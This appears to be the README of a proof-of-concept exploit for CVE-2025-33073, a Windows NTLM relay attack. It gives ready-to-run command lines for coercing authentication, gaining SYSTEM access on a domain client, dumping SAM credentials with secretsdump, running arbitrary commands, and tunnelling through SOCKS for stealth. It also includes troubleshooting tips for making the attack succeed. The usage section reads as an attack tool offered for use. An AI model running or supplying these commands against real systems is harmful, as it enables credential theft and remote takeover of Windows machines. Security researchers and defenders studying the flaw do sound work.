### Prerequisites
OS: Kali Linux (has most packages pre-installed).

* NetExec (NXC) - https://github.com/Pennyw0rth/NetExec
* impacket-ntlmrelayx
* dnstool.py (included in repo)
* xterm (only for GUI)

### Example usage
**GUI**
```
python3 CVE-2025-33073.py -u 'wintastic.local\mathijs' -p 'password' --attacker-ip 192.168.178.49 --dns-ip 192.168.178.138 --dc-fqdn DC01.wintastic.local --target CLIENT01.wintastic.local --target-ip 192.168.178.65
```

**CLI**
```
python3 CVE-2025-33073.py -u 'wintastic.local\mathijs' -p 'password' --attacker-ip 192.168.178.49 --dns-ip 192.168.178.138 --dc-fqdn DC01.wintastic.local --target CLIENT01.wintastic.local --target-ip 192.168.178.65 --cli-only
```

**Custom command**</br>
Instead of running secretsdump a custom command can be executed.
```
python3 CVE-2025-33073.py -u 'wintastic.local\mathijs' -p 'password' --attacker-ip 192.168.178.49 --dns-ip 192.168.178.138 --dc-fqdn DC01.wintastic.local --target CLIENT01.wintastic.local --target-ip 192.168.178.65 --cli-only --custom-command "whoami"
```

**SOCKS**</br>
For more stealthy execution of commands after valid connection as SYSTEM has been made. --target and --target-ip should be equal here.
```
python3 CVE-2025-33073.py -u 'wintastic.local\mathijs' -p 'password' --attacker-ip 192.168.178.49 --dns-ip 192.168.178.138 --dc-fqdn DC01.wintastic.local --target 192.168.178.65 --target-ip 192.168.178.65 --cli-only --socks
```

Also a custom command can be ran through proxychains instead of dumping SAM.
```
proxychains nxc smb 192.168.178.65 -d '' -u '' -p '' -x 'whoami' --exec-method smbexec
```

### Manual exploit without DNS requirement
If you're in the same broadcast domain as the device and it's vulnerable for LLMNR poisioning it's possible to exploit a device without having to register a DNS record.

### Troubleshooting

* I've seen the attack not work sometimes because the hostname is used for the attack which results in a DNS lookup from Kali. If Kali is not using the DNS server or you get a '/ FAILED' message from impacket-ntlmrelayx try adding the host to your /etc/hosts file. This should result in the attack working.
* If using IP the attack should work. Sometimes running it multiple times will result in a SUCCESS instead of failure. It's until now not perfectly clear why this happens. I think it has something to do with networking.
* Try another coerce method using -M or --method.

#### Wireshark

**Local NTLM authentication takes place**

#### Good to know
* xterm allows copying and pasting with the middle mouse button.
* DNS-record should also be known to the client, this can take more time in some occasions. With more time I mean give it a couple of minutes.
* This is just a PoC which means AV/EDR bypasses have not been tried to bypass. Use at own risk.
